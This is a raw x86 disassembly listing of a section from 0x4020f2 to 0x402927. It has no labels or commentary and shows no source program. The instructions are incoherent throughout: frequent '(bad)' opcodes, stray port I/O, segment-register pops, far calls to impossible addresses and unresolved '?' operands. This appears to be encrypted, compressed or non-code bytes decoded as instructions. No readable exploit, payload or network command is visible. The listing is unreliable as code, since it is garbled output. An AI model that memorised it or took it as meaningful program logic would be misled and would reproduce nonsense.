  4020f2:	sub    eax,0x9a5de271
  4020f7:	out    dx,eax
  4020f8:	fucomip st,st(3)
  4020fa:	in     al,dx
  4020fb:	mov    ss,WORD PTR [ecx+0x6b]
  4020fe:	(bad)  
  4020ff:	mov    esp,0x51a74022
  402104:	(bad)  
  402105:	mov    ch,0xd1
  402107:	ds out dx,al
  402109:	xor    al,0x58
  40210b:	data16 sti 
  40210d:	cmc    
  40210e:	push   0x91133c65
  402113:	xor    eax,0x7c0d59a
  402118:	scas   eax,DWORD PTR es:[edi]
  402119:	adc    DWORD PTR [ebp-0x51],ecx
  40211c:	gs push eax
  40211e:	sub    eax,0xe6e29ed9
  402123:	or     eax,0xc798eb10
  402128:	dec    ebp
  402129:	push   eax
  40212a:	sbb    esi,DWORD PTR [eax-0x67]
  40212d:	aaa    
  40212e:	pusha  
  40212f:	pop    ds
  402130:	cli    
  402131:	pop    es
  402132:	mov    ?,WORD PTR cs:[ebx+0x51101cc3]
  402139:	xchg   edi,eax
  40213a:	shl    DWORD PTR [edi-0x13871154],0xc
  402141:	pop    ss
  402142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402143:	jmp    0xdd9c:0x7c6a8663
  40214a:	xor    BYTE PTR [ebp-0x73],cl
  40214d:	adc    eax,0x1d94f111
  402152:	aaa    
  402153:	pop    ds
  402154:	mov    ds:0xf32c9d3a,al
  402159:	mov    ch,BYTE PTR [edi+0x7fc65479]
  40215f:	cmp    bl,BYTE PTR [eax+0x5eed953e]
  402165:	ins    BYTE PTR es:[edi],dx
  402166:	push   ds
  402167:	adc    bl,dl
  402169:	inc    ebx
  40216a:	mov    DWORD PTR [edx-0x50],edi
  40216d:	addr16 mov dh,0x3d
  402170:	cmp    esp,DWORD PTR [ecx]
  402172:	mov    ebx,0x64432236
  402177:	mov    ds:0xf2e7840c,al
  40217c:	mov    dh,0xce
  40217e:	mov    cl,0xe7
  402180:	inc    edi
  402181:	mov    bh,0x57
  402183:	fimul  DWORD PTR [ebx]
  402185:	ds push cs
  402187:	jae    0x4021cf
  402189:	mov    eax,0xe126abe1
  40218e:	and    dl,BYTE PTR [ecx]
  402190:	pop    edi
  402191:	pop    ebp
  402192:	bound  edi,QWORD PTR [edi]
  402194:	xor    al,0xbb
  402196:	jl     0x402140
  402198:	ret    0x2ebf
  40219b:	lahf   
  40219c:	pop    ebp
  40219d:	mov    ss,WORD PTR [esi+0x38]
  4021a0:	stc    
  4021a1:	pop    ebp
  4021a2:	cdq    
  4021a3:	sub    eax,0xf387fb95
  4021a8:	push   edi
  4021a9:	ror    BYTE PTR [edi-0x33e3a96d],0x3
  4021b0:	and    DWORD PTR [esi-0x458cca27],ecx
  4021b6:	mov    ecx,0x4976ec9e
  4021bb:	inc    BYTE PTR [ebp-0x2d]
  4021be:	out    0x68,eax
  4021c0:	add    al,0x7e
  4021c2:	retf   0x66a9
  4021c5:	cmc    
  4021c6:	stos   BYTE PTR es:[edi],al
  4021c7:	(bad)  
  4021c9:	adc    DWORD PTR [esi+0x22720034],0x4f1df8ab
  4021d3:	nop
  4021d4:	inc    edi
  4021d5:	jbe    0x4021aa
  4021d7:	es addr16 adc esi,ebp
  4021db:	jp     0x4021dd
  4021dd:	dec    esi
  4021de:	pop    edi
  4021df:	or     DWORD PTR [ebx-0x4a041cd6],ecx
  4021e5:	rol    DWORD PTR [esi-0x448eee9],0x13
  4021ec:	mov    ebx,0x94faf663
  4021f1:	push   DWORD PTR [edi]
  4021f3:	les    eax,FWORD PTR ds:0x840a3b17
  4021f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021fa:	jle    0x402207
  4021fc:	loope  0x40223d
  4021fe:	jle    0x402268
  402200:	dec    edx
  402201:	add    edi,edx
  402203:	or     eax,0x3999f4a9
  402208:	imul   eax,DWORD PTR [ebx-0x39],0xb9b145bb
  40220f:	mov    BYTE PTR [ecx+0x28544916],0xf6
  402216:	pop    esp
  402217:	repnz push eax
  402219:	xchg   esi,eax
  40221a:	in     al,0x5d
  40221c:	cs dec esi
  40221e:	mov    bh,BYTE PTR [edx+0x2c4be85c]
  402224:	cmp    bl,dh
  402226:	and    esp,eax
  402228:	cmp    al,0x58
  40222a:	aam    0x11
  40222c:	mov    al,ds:0x6216f90
  402231:	out    0x98,al
  402233:	or     dh,BYTE PTR [ebp+eax*2-0x62386e08]
  40223a:	cld    
  40223b:	dec    eax
  40223c:	hlt    
  40223d:	adc    eax,esi
  40223f:	adc    eax,DWORD PTR [ebx+0x17406199]
  402245:	mov    ch,0xbf
  402247:	push   ds
  402248:	sahf   
  402249:	pop    ebp
  40224a:	jecxz  0x402224
  40224c:	inc    eax
  40224d:	int    0x5
  40224f:	not    DWORD PTR [ebp-0x53]
  402252:	pop    esi
  402253:	outs   dx,DWORD PTR ds:[esi]
  402254:	jno    0x4022c6
  402256:	push   edi
  402257:	and    BYTE PTR [edi+ebp*8-0x52933abf],dh
  40225e:	or     DWORD PTR [ebx-0x12636fbe],ecx
  402264:	push   esp
  402265:	lahf   
  402266:	sbb    al,0xd7
  402268:	jge    0x4022c1
  40226a:	add    esp,DWORD PTR [edi+0x521350cd]
  402270:	xchg   esp,eax
  402271:	in     eax,dx
  402272:	sbb    dl,cl
  402274:	sbb    BYTE PTR [ebx],cl
  402276:	dec    ecx
  402277:	jo     0x402235
  402279:	inc    edi
  40227a:	lds    edx,FWORD PTR [eax-0x799d5747]
  402280:	aaa    
  402281:	and    BYTE PTR [edx-0x37],bl
  402284:	mov    al,0x2e
  402286:	retf   0xed1f
  402289:	push   eax
  40228a:	aam    0x96
  40228c:	mov    eax,0x4d304b9c
  402291:	int3   
  402292:	push   ebp
  402293:	fsub   DWORD PTR [eax-0x3db7114e]
  402299:	add    ah,BYTE PTR [edx-0x43d37271]
  40229f:	mov    ebp,DWORD PTR [ebp+0x45]
  4022a2:	mov    al,ds:0xe2083636
  4022a7:	push   0x36
  4022a9:	jb     0x402234
  4022ab:	or     DWORD PTR [ebx-0x1d7e651e],esp
  4022b1:	js     0x4022a5
  4022b3:	dec    ebp
  4022b4:	les    edx,FWORD PTR [edx]
  4022b6:	mov    eax,DWORD PTR [edi-0x3e]
  4022b9:	sbb    ebx,DWORD PTR [ebp-0x2b79a37]
  4022bf:	test   DWORD PTR [ebp+0x48],ebx
  4022c2:	fistp  WORD PTR [edx+ebp*8+0x2b]
  4022c6:	pop    ss
  4022c7:	xor    ebp,ebx
  4022c9:	xor    eax,0x99f0bf0a
  4022ce:	call   0xa6b7afe5
  4022d3:	xor    BYTE PTR [ebx+0x253f3909],al
  4022d9:	or     DWORD PTR [ebx],esi
  4022db:	addr16 (bad) 
  4022dd:	out    dx,al
  4022de:	pop    ss
  4022df:	pop    ebx
  4022e0:	clc    
  4022e1:	ret    0xdb47
  4022e4:	icebp  
  4022e5:	sbb    dh,BYTE PTR [eax]
  4022e7:	lahf   
  4022e8:	out    0xbd,eax
  4022ea:	mov    ah,0x97
  4022ec:	add    dh,BYTE PTR [edi+0x4d]
  4022ef:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4022f1:	pop    edi
  4022f2:	or     ecx,DWORD PTR [edi+0x71d34f1]
  4022f8:	jo     0x402307
  4022fa:	xchg   edx,eax
  4022fb:	jb     0x4022e1
  4022fd:	lock sub eax,0xf5f8dad0
  402304:	push   esp
  402305:	sbb    eax,0xd6ebeef8
  40230a:	sbb    BYTE PTR [esi],cl
  40230c:	sbb    edx,DWORD PTR [esi+0x70ba5f59]
  402312:	ss repz out 0x98,al
  402316:	push   edx
  402317:	and    esi,ebp
  402319:	(bad)  
  40231a:	mov    ah,0xd3
  40231c:	dec    ebp
  40231d:	popa   
  40231e:	pop    ebp
  40231f:	rcl    BYTE PTR [eax+0x166b2ae2],cl
  402325:	mov    gs,WORD PTR [edx+0x1b]
  402328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402329:	test   eax,0x257650a7
  40232e:	and    esi,ecx
  402330:	shr    edi,1
  402332:	push   edi
  402333:	in     al,0x16
  402335:	mov    dh,0xd5
  402337:	sbb    esp,DWORD PTR [eax-0x30]
  40233a:	test   eax,0x5aa56abb
  40233f:	xchg   ebp,eax
  402340:	inc    eax
  402341:	sub    ebp,ebp
  402343:	hlt    
  402344:	sub    dl,bl
  402346:	cmp    DWORD PTR [eax],ebp
  402348:	rol    BYTE PTR [ebx+ecx*1+0x3b152d03],0xc8
  402350:	push   ds
  402351:	inc    edx
  402352:	xchg   ebp,eax
  402353:	fistp  DWORD PTR cs:[edx]
  402356:	ja     0x40238f
  402358:	fmul   st(7),st
  40235a:	nop
  40235b:	pop    es
  40235c:	push   cs
  40235d:	xor    DWORD PTR [edi],ebx
  40235f:	mov    eax,?
  402361:	sbb    BYTE PTR [eax+0x3e],bh
  402364:	jl     0x4023b8
  402366:	imul   BYTE PTR [eax+0x7a]
  402369:	rcl    DWORD PTR [eax-0x3],0x93
  40236d:	call   DWORD PTR [edx-0x4e47af86]
  402373:	add    eax,ebx
  402375:	add    dh,BYTE PTR [edi+0x41641b03]
  40237b:	clc    
  40237c:	fnstenv [edx+0x36]
  40237f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402380:	cmp    BYTE PTR [eax],ch
  402382:	fwait
  402383:	sub    dl,BYTE PTR [ebp+0x4200957c]
  402389:	rcr    BYTE PTR [ebp+ebp*2-0x4ad7fc04],cl
  402390:	mov    eax,0xfd7609cb
  402395:	jle    0x40232e
  402397:	mov    esp,0xed6acf91
  40239c:	or     ch,BYTE PTR [ebx+eax*1+0x47]
  4023a0:	daa    
  4023a1:	or     eax,0x22bb34a8
  4023a6:	rcr    BYTE PTR [esi+0x5d],1
  4023a9:	ret    
  4023aa:	adc    DWORD PTR [edi],edi
  4023ac:	mov    ds:0xab31da3d,eax
  4023b1:	adc    dl,BYTE PTR [esi]
  4023b3:	mov    ?,WORD PTR [esi+0x37e610b7]
  4023b9:	sbb    eax,0xcae4400
  4023be:	jns    0x402409
  4023c0:	pushf  
  4023c1:	aaa    
  4023c2:	hlt    
  4023c3:	iret   
  4023c4:	sub    eax,0x5d66f4e5
  4023c9:	pop    ebp
  4023ca:	add    al,BYTE PTR [ecx]
  4023cc:	xchg   esp,eax
  4023cd:	lea    ebp,ds:0xc6bff894
  4023d3:	sbb    eax,0x9ae88712
  4023d8:	ds pop es
  4023da:	push   ecx
  4023db:	push   ss
  4023dc:	cmc    
  4023dd:	out    0xe6,al
  4023df:	pop    ecx
  4023e0:	pop    esp
  4023e1:	xor    dh,ch
  4023e3:	cld    
  4023e4:	int3   
  4023e5:	sbb    DWORD PTR [ecx+0x45],eax
  4023e8:	jns    0x40239a
  4023ea:	addr16 mov cl,0xec
  4023ed:	jae    0x4023c8
  4023ef:	cmp    al,BYTE PTR [edx]
  4023f1:	add    bl,BYTE PTR [edx-0x43]
  4023f4:	or     edi,ecx
  4023f6:	(bad)  
  4023f7:	or     DWORD PTR [eax+0x47],0xb1c27e73
  4023fe:	ins    BYTE PTR es:[edi],dx
  4023ff:	test   eax,0x5f290693
  402404:	xchg   ecx,eax
  402405:	stos   BYTE PTR es:[edi],al
  402406:	or     DWORD PTR [esi],0xe7ba6305
  40240c:	push   esp
  40240d:	pushf  
  40240e:	nop
  40240f:	clc    
  402410:	dec    ecx
  402411:	call   0x44426de2
  402416:	push   edi
  402417:	je     0x402446
  402419:	pop    eax
  40241a:	cmc    
  40241b:	cmp    ebp,DWORD PTR ds:0x435c30f2
  402421:	dec    ebp
  402422:	mov    ch,0xe9
  402424:	xlat   BYTE PTR ds:[ebx]
  402425:	sbb    DWORD PTR [ecx-0x2e8ddd1a],0xf94d7e20
  40242f:	xlat   BYTE PTR ds:[ebx]
  402430:	dec    ecx
  402431:	out    dx,eax
  402432:	int3   
  402433:	(bad)  
  402434:	jne    0x402461
  402436:	inc    eax
  402437:	and    DWORD PTR [edi-0x3b],esp
  40243a:	nop
  40243b:	cdq    
  40243c:	(bad)  
  40243d:	mov    dl,0x19
  40243f:	(bad)  
  402440:	into   
  402441:	mov    DWORD PTR [esi],ebp
  402443:	pop    ds
  402444:	xchg   edi,eax
  402445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402446:	sbb    BYTE PTR [edi+edi*1],dl
  402449:	mov    ebp,edi
  40244b:	(bad)  
  40244c:	pop    ds
  40244d:	xor    DWORD PTR gs:[bx+si],esi
  402451:	call   0xb1ffd701
  402456:	inc    di
  402458:	(bad)  
  402459:	pop    ecx
  40245a:	inc    esp
  40245b:	sub    eax,0x67510cec
  402460:	in     eax,dx
  402461:	jbe    0x4024a2
  402463:	add    BYTE PTR [ebx+0x66910319],ah
  402469:	mov    al,0xaf
  40246b:	sbb    esp,esp
  40246d:	push   edx
  40246e:	in     al,dx
  40246f:	test   BYTE PTR [edi+0x54843698],ch
  402475:	sar    BYTE PTR ds:0xe1c7420f,0xa3
  40247c:	lock mov ecx,0x5353cf79
  402482:	sbb    ah,BYTE PTR [ecx]
  402484:	mov    al,0x39
  402486:	dec    ecx
  402487:	xchg   esi,eax
  402488:	mov    ss,WORD PTR ds:0xe39658e8
  40248e:	aam    0xf7
  402490:	out    dx,eax
  402491:	inc    esi
  402492:	jbe    0x40245a
  402494:	or     eax,0xba76ff44
  402499:	fdiv   DWORD PTR [ebx]
  40249b:	fiadd  WORD PTR [edi+0x34071df4]
  4024a1:	dec    eax
  4024a2:	push   0xffffffa9
  4024a4:	dec    eax
  4024a5:	mov    eax,ds:0x3fcc238f
  4024aa:	push   ebx
  4024ab:	jge    0x4024bc
  4024ad:	(bad)  
  4024af:	add    ebp,edx
  4024b1:	jg     0x40250d
  4024b3:	dec    edx
  4024b4:	pop    ds
  4024b5:	push   ecx
  4024b6:	and    edx,DWORD PTR ds:0xa79ecc3e
  4024bc:	aam    0x3b
  4024be:	pop    ebp
  4024bf:	call   0x3882:0x739fb2eb
  4024c6:	push   esi
  4024c7:	push   ebx
  4024c8:	lock and bh,BYTE PTR [edi]
  4024cb:	add    eax,0x7ff974c3
  4024d0:	add    ch,BYTE PTR [esi-0x27]
  4024d3:	jo     0x40249c
  4024d5:	adc    esp,DWORD PTR [ebx]
  4024d7:	add    bh,0x5
  4024da:	ins    DWORD PTR es:[edi],dx
  4024db:	mov    esi,0xb84ca31f
  4024e0:	push   esi
  4024e1:	inc    edx
  4024e2:	or     BYTE PTR [edi+eiz*4-0x74],ch
  4024e6:	in     al,dx
  4024e7:	fsub   DWORD PTR [ecx-0x2bd319b7]
  4024ed:	repnz and BYTE PTR [edi],0xbb
  4024f1:	idiv   DWORD PTR [edx-0xf4a5ba5]
  4024f7:	(bad)  
  4024f8:	ffreep st(5)
  4024fa:	shl    BYTE PTR [edi+edi*1],1
  4024fd:	gs iret 
  4024ff:	mov    ah,0x78
  402501:	jle    0x402547
  402503:	xchg   ecx,eax
  402504:	pop    edx
  402505:	sub    al,0x20
  402507:	xchg   ebp,eax
  402508:	gs (bad) 
  40250a:	(bad)
  40250e:	scas   al,BYTE PTR es:[edi]
  40250f:	or     eax,0x7df333b6
  402514:	pmulhw mm4,mm1
  402517:	fcomi  st,st(2)
  402519:	or     eax,0x3e5e2261
  40251e:	pop    ebp
  40251f:	xor    BYTE PTR cs:[eax-0x5c],ch
  402523:	push   eax
  402524:	or     eax,DWORD PTR ds:0x9fa10fd3
  40252a:	xor    esi,DWORD PTR [edx+0x79cd53a8]
  402530:	inc    ebx
  402531:	shl    BYTE PTR [esi+0x5ee35449],cl
  402537:	sbb    al,0xee
  402539:	fnstenv cs:0x2abc4b9a
  402540:	sub    BYTE PTR [edi],ch
  402542:	xchg   ecx,eax
  402543:	aas    
  402544:	dec    esp
  402545:	jle    0x402563
  402547:	in     al,0x15
  402549:	popa   
  40254a:	sub    ecx,DWORD PTR [ecx]
  40254c:	mov    al,ds:0x4539dd06
  402551:	mov    eax,ds:0x8432b685
  402556:	mov    edx,0xb6e1f8d5
  40255b:	sbb    eax,0xbf032903
  402560:	jns    0x40257c
  402562:	clc    
  402563:	dec    edi
  402564:	call   0xc1446b6e
  402569:	pop    es
  40256a:	ins    BYTE PTR es:[edi],dx
  40256b:	mov    cl,0xd8
  40256d:	nop
  40256e:	mov    bh,0x5b
  402570:	sar    BYTE PTR [ebx+0x763a9694],1
  402576:	pop    ds
  402577:	sbb    al,0x42
  402579:	repnz push cs
  40257b:	push   gs
  40257d:	in     al,dx
  40257e:	mov    cl,0x42
  402580:	es cmp eax,0xa869deff
  402586:	or     dh,BYTE PTR [ebp+0xa60082a]
  40258c:	sub    ah,dl
  40258e:	jae    0x40258e
  402590:	jmp    0xfb72135
  402595:	jae    0x4025e1
  402597:	sbb    dh,BYTE PTR [edx+ebp*1+0x1d]
  40259b:	ins    BYTE PTR es:[edi],dx
  40259c:	test   al,0x66
  40259e:	lods   eax,DWORD PTR ds:[esi]
  40259f:	int    0x86
  4025a1:	mov    eax,ds:0x32180508
  4025a6:	rol    DWORD PTR [ebx+edx*8-0x30094907],cl
  4025ad:	cmp    al,0xa7
  4025af:	popf   
  4025b0:	and    DWORD PTR [ebx-0x71],ebx
  4025b3:	or     edi,DWORD PTR [ecx]
  4025b5:	sub    al,0x1e
  4025b7:	jp     0x402540
  4025b9:	sub    BYTE PTR [eax+ecx*2-0x5f2a4e3],dh
  4025c0:	push   ds
  4025c1:	mov    eax,0x4e49755e
  4025c6:	ret    
  4025c7:	ret    
  4025c8:	aas    
  4025c9:	jle    0x40262f
  4025cb:	push   0x548a0749
  4025d0:	dec    ebx
  4025d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d2:	cwde   
  4025d3:	sbb    eax,0x9ede2a47
  4025d8:	and    eax,0xb214e951
  4025dd:	fcomp  QWORD PTR [ecx]
  4025df:	ficom  WORD PTR [ebp+0x22]
  4025e2:	es push ds
  4025e4:	adc    al,0xa9
  4025e6:	call   0x67f9:0x5044c9b0
  4025ed:	loop   0x4025b9
  4025ef:	push   ds
  4025f0:	ja     0x4025d2
  4025f2:	cs cmp eax,0x8d8c3669
  4025f8:	test   DWORD PTR [eax-0x5c57b74],esp
  4025fe:	sub    ebx,DWORD PTR ds:0xe5cc0395
  402604:	into   
  402605:	dec    esp
  402606:	mov    esi,0xc7502fc2
  40260b:	adc    BYTE PTR [ebx-0x80df116],bh
  402611:	aas    
  402612:	out    dx,eax
  402613:	sub    DWORD PTR [eax+0x7d02de4f],edi
  402619:	ss fs scas eax,DWORD PTR es:[edi]
  40261c:	xchg   edi,eax
  40261d:	xor    eax,0x52bc10b8
  402622:	dec    eax
  402623:	sub    ebp,DWORD PTR [esi]
  402625:	jp     0x40266a
  402627:	push   0xec1676a4
  40262c:	lahf   
  40262d:	(bad)  
  40262e:	xchg   esi,eax
  40262f:	sub    esi,DWORD PTR [edx]
  402631:	in     eax,dx
  402632:	arpl   bx,di
  402634:	xor    eax,0xd9b3fbec
  402639:	dec    edi
  40263a:	jmp    0x12229a4e
  40263f:	add    ecx,esi
  402641:	neg    DWORD PTR [eax-0x7c]
  402644:	es push ebx
  402646:	rol    DWORD PTR [esi+0x78b51780],0x7c
  40264d:	fnstenv [edx-0x2aa394b3]
  402653:	fwait
  402654:	mov    ecx,0x75d48585
  402659:	(bad)  
  40265a:	sub    al,0x3d
  40265c:	or     BYTE PTR [esi],0xf3
  40265f:	call   0x2ce1:0xe0f4fe14
  402666:	stos   BYTE PTR es:[edi],al
  402667:	sti    
  402668:	push   eax
  402669:	mov    ds:0xc545bcc2,al
  40266e:	mov    dl,0x9
  402670:	jns    0x4026da
  402672:	mov    al,ds:0x20f68ccb
  402677:	or     eax,0x9c388d9e
  40267c:	and    ecx,DWORD PTR [edx+eiz*1+0x65b9258d]
  402683:	mov    WORD PTR [ebx+0x1b],cs
  402686:	xchg   esi,eax
  402687:	ds push 0x2d36b99
  40268d:	inc    ebx
  40268e:	rol    edi,cl
  402690:	jle    0x402652
  402692:	and    cl,al
  402694:	mov    edx,0xc2099d03
  402699:	gs ret 0x10f0
  40269d:	push   ds
  40269e:	js     0x402629
  4026a0:	mov    ecx,0xc3df6420
  4026a5:	in     al,dx
  4026a6:	lods   al,BYTE PTR ds:[esi]
  4026a7:	or     edi,0xa1e9ad4b
  4026ad:	push   es
  4026ae:	jnp    0x402677
  4026b0:	pop    esp
  4026b1:	stc    
  4026b2:	mov    eax,0x1d62fe72
  4026b7:	jmp    0xa0801ab8
  4026bc:	dec    eax
  4026bd:	in     al,0x98
  4026bf:	nop    eax
  4026c2:	cmp    eax,0xdffab120
  4026c7:	lds    esi,FWORD PTR [edx+0x652ad455]
  4026cd:	jg     0x402669
  4026cf:	or     al,0x38
  4026d1:	sub    BYTE PTR [ecx+0x20e900fb],0xa8
  4026d8:	jbe    0x40269e
  4026da:	jecxz  0x402729
  4026dc:	cmp    edx,ebp
  4026de:	bound  ebp,QWORD PTR [eax-0x5b]
  4026e1:	sti    
  4026e2:	sbb    bh,BYTE PTR [ebx-0x3f]
  4026e5:	jns    0x4026b6
  4026e7:	xchg   ecx,esi
  4026e9:	stos   DWORD PTR es:[edi],eax
  4026ea:	jno    0x402717
  4026ec:	jne    0x4026f5
  4026ee:	pop    edx
  4026ef:	xor    DWORD PTR [edi+ebp*4-0x1e4fc2c7],esi
  4026f6:	pop    ebp
  4026f7:	clc    
  4026f8:	inc    ebp
  4026f9:	shr    ebx,1
  4026fb:	jae    0x402688
  4026fd:	adc    DWORD PTR [edi-0x6acd628b],esi
  402703:	push   ebx
  402704:	clc    
  402705:	mov    WORD PTR [esi+0x26],ss
  402708:	xchg   ecx,eax
  402709:	ss jne 0x4026b4
  40270c:	ds mov esi,0xcc6316b5
  402712:	or     eax,0x5bf28f74
  402717:	in     eax,dx
  402718:	xor    edx,DWORD PTR [esi]
  40271a:	mov    ds:0x74d2a5a3,eax
  40271f:	and    dl,dl
  402721:	pop    esi
  402722:	cmp    eax,0x33734197
  402727:	or     BYTE PTR [esi],0xfd
  40272a:	sub    eax,0xef142da7
  40272f:	push   0xffffffcd
  402731:	xor    eax,0x3782f064
  402736:	retw   0x1d05
  40273a:	into   
  40273b:	imul   esi,ebx,0x2b92fc22
  402741:	lea    esi,[edi]
  402743:	fld    TBYTE PTR [ebp-0x35]
  402746:	imul   eax,DWORD PTR [ebx+0x322ae83],0xc3f193cb
  402750:	imul   esp,esp,0x40
  402753:	dec    esi
  402754:	pop    esi
  402755:	push   ss
  402756:	jp     0x402743
  402758:	ret    
  402759:	lahf   
  40275a:	push   cs
  40275b:	lds    edx,FWORD PTR [edi+0x6e]
  40275e:	jo     0x40271d
  402760:	ja     0x402767
  402762:	jmp    0x4027cf
  402764:	adc    BYTE PTR [esi+0x52],al
  402767:	xchg   edx,eax
  402768:	mov    cl,0x27
  40276a:	test   BYTE PTR [ebp+0x5d],ch
  40276d:	dec    edi
  40276e:	and    eax,0xf8314ffc
  402773:	lock gs xchg ebp,eax
  402776:	test   eax,0x1f093d74
  40277b:	nop
  40277c:	icebp  
  40277d:	loop   0x4027bd
  40277f:	je     0x402720
  402781:	in     eax,0xe6
  402783:	daa    
  402784:	sbb    eax,0x26db97a3
  402789:	cmc    
  40278a:	mov    BYTE PTR [ebp+0x72776812],bl
  402790:	imul   edi,esi,0xc
  402793:	sub    ebx,ebp
  402795:	cdq    
  402796:	xor    eax,0x530a73b2
  40279b:	ja     0x4027d7
  40279d:	int3   
  40279e:	out    dx,eax
  40279f:	dec    edx
  4027a0:	inc    esi
  4027a1:	jno    0x4027c3
  4027a3:	fnstenv [eax]
  4027a5:	mov    ch,0xb8
  4027a7:	and    al,0xa5
  4027a9:	add    eax,0x2c80f038
  4027ae:	leave  
  4027af:	push   ebp
  4027b0:	mov    ah,0x75
  4027b2:	xchg   edx,eax
  4027b3:	ror    BYTE PTR [ecx+0x20],1
  4027b6:	push   esp
  4027b7:	xor    cl,BYTE PTR [edi+ecx*1-0x6f0d659b]
  4027be:	enter  0x9655,0x6b
  4027c2:	arpl   WORD PTR [edx-0x19],ax
  4027c5:	push   0x5
  4027c7:	bound  ecx,QWORD PTR [edx-0x6092a11d]
  4027cd:	mov    bl,0xa4
  4027cf:	sbb    BYTE PTR [esi+eax*4+0x439794a0],0x97
  4027d7:	jecxz  0x402775
  4027d9:	pop    ebx
  4027da:	cli    
  4027db:	xchg   bh,bl
  4027dd:	mov    BYTE PTR [ecx+0x2f],ch
  4027e0:	inc    edi
  4027e1:	scas   eax,DWORD PTR es:[edi]
  4027e2:	pop    ecx
  4027e3:	enter  0x56cc,0x5d
  4027e7:	popf   
  4027e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e9:	mov    edx,0xb5ee58a4
  4027ee:	ss pop edi
  4027f0:	out    0xe0,eax
  4027f2:	push   0x6b2ef52a
  4027f7:	ss push ebx
  4027f9:	hlt    
  4027fa:	faddp  st(0),st
  4027fc:	or     al,0x5a
  4027fe:	pop    esi
  4027ff:	sti    
  402800:	pop    ecx
  402801:	icebp  
  402802:	(bad)  
  402803:	cmc    
  402804:	xlat   BYTE PTR ds:[bx]
  402806:	aas    
  402807:	xor    esi,DWORD PTR [esi+0x56e922f2]
  40280d:	sar    DWORD PTR [ecx],cl
  40280f:	or     al,0xb9
  402811:	xchg   ecx,eax
  402812:	lods   al,BYTE PTR ds:[esi]
  402813:	in     al,0xf8
  402815:	fs ins BYTE PTR es:[edi],dx
  402817:	xor    al,0x38
  402819:	ins    DWORD PTR es:[edi],dx
  40281a:	xchg   BYTE PTR [edx],al
  40281c:	sub    ebx,DWORD PTR [edx+0x12]
  40281f:	adc    ah,BYTE PTR [ecx]
  402821:	scas   eax,DWORD PTR es:[edi]
  402822:	rcr    edi,cl
  402824:	dec    ebp
  402825:	and    eax,0x16e9ed34
  40282a:	pop    ss
  40282b:	lds    ecx,FWORD PTR [esi+0x7880dac8]
  402831:	adc    BYTE PTR [ecx+0x1b],ch
  402834:	in     eax,dx
  402835:	jno    0x40286d
  402837:	es xchg ecx,eax
  402839:	sbb    DWORD PTR [ebp+0x6907e948],edx
  40283f:	ss jle 0x40283e
  402842:	es mov cl,0x8e
  402845:	imul   ecx,DWORD PTR [edi],0x9482b25b
  40284b:	add    bl,BYTE PTR [ebp+0x1c10c980]
  402851:	addr16 mov al,0x32
  402854:	push   esi
  402855:	(bad)  
  402856:	xchg   edx,eax
  402857:	adc    esi,DWORD PTR [edx-0x16]
  40285a:	daa    
  40285b:	mov    ch,0x57
  40285d:	not    BYTE PTR [ebp*8+0x1fa908bd]
  402864:	sti    
  402865:	ror    BYTE PTR [ecx-0xb37539b],cl
  40286b:	xchg   BYTE PTR [esi-0x17],al
  40286e:	std    
  40286f:	mov    WORD PTR [edi-0x2b29cd],?
  402875:	sub    DWORD PTR [eax+0x2f],eax
  402878:	jle    0x402880
  40287a:	fld    TBYTE PTR [eax-0x38]
  40287d:	mov    esi,0x99f77e8a
  402882:	inc    edi
  402883:	xchg   ebx,eax
  402884:	pop    ebp
  402885:	setae  BYTE PTR [eax]
  402888:	int    0xc7
  40288a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40288b:	(bad)  
  40288c:	sbb    dh,dl
  40288e:	ins    DWORD PTR es:[edi],dx
  40288f:	adc    esi,DWORD PTR [ebp-0x16]
  402892:	sub    BYTE PTR [edx-0x3463feb6],ch
  402898:	push   esi
  402899:	aas    
  40289a:	cmp    eax,DWORD PTR [esi]
  40289c:	cdq    
  40289d:	(bad)  
  40289e:	sub    DWORD PTR [edx],ecx
  4028a0:	stos   DWORD PTR es:[edi],eax
  4028a1:	jmp    0x40287e
  4028a3:	cmp    eax,0x8851df60
  4028a8:	mov    DWORD PTR [ecx],edi
  4028aa:	jbe    0x40283e
  4028ac:	push   es
  4028ad:	ret    0x400c
  4028b0:	adc    dh,BYTE PTR [edx]
  4028b2:	xor    BYTE PTR [ebx+0x41],bl
  4028b5:	daa    
  4028b6:	call   0xec21:0x8ba7a1a0
  4028bd:	xchg   ecx,eax
  4028be:	imul   ecx,DWORD PTR [eax-0x51957b5],0xffffffc6
  4028c5:	loope  0x4028e1
  4028c7:	inc    esp
  4028c8:	pusha  
  4028c9:	push   ecx
  4028ca:	push   ebx
  4028cb:	test   BYTE PTR [esp+ebp*1-0x58fc62d8],dl
  4028d2:	sub    bl,BYTE PTR [ebp-0xb5a401a]
  4028d8:	clc    
  4028d9:	(bad)  
  4028da:	cmp    ch,BYTE PTR [esi]
  4028dc:	int3   
  4028dd:	lods   eax,DWORD PTR ds:[esi]
  4028de:	loop   0x4028b4
  4028e0:	int3   
  4028e1:	add    al,0x42
  4028e3:	das    
  4028e4:	jb     0x40294b
  4028e6:	sahf   
  4028e7:	ror    BYTE PTR [ebp-0x2e8dfcc2],1
  4028ed:	dec    esi
  4028ee:	aad    0xe
  4028f0:	cwde   
  4028f1:	(bad)  
  4028f2:	push   ebp
  4028f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f4:	imul   esp,DWORD PTR [ebp-0x7b],0xb9c4236f
  4028fb:	sub    edi,ebp
  4028fd:	pop    esi
  4028fe:	jle    0x402944
  402900:	call   0x958c049e
  402905:	lods   al,BYTE PTR ds:[esi]
  402906:	or     eax,0x6640eac4
  40290b:	jns    0x402932
  40290d:	in     eax,0x95
  40290f:	sbb    ecx,DWORD PTR [esi+0x35]
  402912:	dec    edi
  402913:	test   DWORD PTR [edi+0x4115e829],eax
  402919:	cwde   
  40291a:	out    dx,eax
  40291b:	adc    dh,al
  40291d:	sub    edx,DWORD PTR [ecx+0x26]
  402920:	jno    0x402924
  402922:	mov    ecx,DWORD PTR [eax-0x77]
  402925:	pop    ecx
  402926:	pop    esp
  402927:	sub    esi,edi
